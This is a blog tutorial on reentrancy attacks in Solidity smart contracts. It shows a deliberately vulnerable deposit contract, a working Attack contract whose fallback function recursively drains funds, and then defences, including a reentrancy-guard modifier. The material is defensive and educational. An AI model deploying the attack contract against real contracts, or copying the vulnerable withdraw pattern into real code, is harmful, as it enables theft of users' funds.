---
title: Secure Smart Contracts from Reentrancy attack
date: 2021-12-06
image: /assets/images/blog/12.jpg
tags: security, web3, smart-contracts,blockchain,solidity
---

Reentrancy attack is one of the most destructive attacks in Solidity smart contract. A reentrancy attack occurs when a function makes an external call to another untrusted contract. Then the untrusted contract makes a recursive call back to the original function in an attempt to drain funds.

When the contract fails to update its state prior to sending funds the attacker can continuously call the withdraw function to drain the contract’s funds. A famous real-world Reentrancy attack is the DAO attack which caused a loss of 60 million US dollars

### How does reentrancy attack work?

A reentrancy attack involves two smart contracts. A vulnerable contract and an untrusted attackers contract.

![Reentrancy Attack in Solidity Smart Contract](/assets/images/blog/12.1.jpg)

### Reentrancy attack scenario

1.  Vulnerable smart contract have 10 eth.
2.  An attacker store 1 eth using deposit function.
3.  An attacker calls the withdraw function and points to a malicious contract as a recipient.
4.  Now withdraw function will verify if it can be executed:

- Does the attacker have 1 eth on their balance? Yes – because of their deposit.
- Transfer 1 eth to a malicious contract. (Note: attacker balance has NOT been updated yet)
- Fallback function on received eth calls withdraw function again.

5.  Now withdraw function will verify if it can be executed:

- Does the attacker have 1 eth on their balance? Yes – because the balance has not been updated.
- Transfer 1 eth to a malicious contract.
- and again until the attacker will drain all the funds stored on the contract

Below is the contract which contains the reentrancy vulnerability

```
contract DepositFunds {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
}
```

The vulnerability comes where we send the user their requested amount of ether. In this case, the attacker calls withdraw() function. Since his balance has not yet been set to 0, he is able to transfer the tokens even though he already received tokens.

Now, let's consider a malicious attacker creating the following contract

```
contract Attack {
    DepositFunds public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }


}
```

The attack function calls the withdraw function in the victim’s contract. When the token is received the fallback function calls back the withdraw function. Since the check is passed contract sends the token to the attacker which triggers the fallback function.

### How to protect smart contract against reentrancy attack?

To prevent a reentrancy attack in a Solidity smart contract you should:

- Ensure all state changes happen before calling external contracts, i.e. update balances or code internally before calling external code
- Use function modifiers that prevent re-entrancy

#### Modifier to prevent a reentrancy attack

```
contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
```
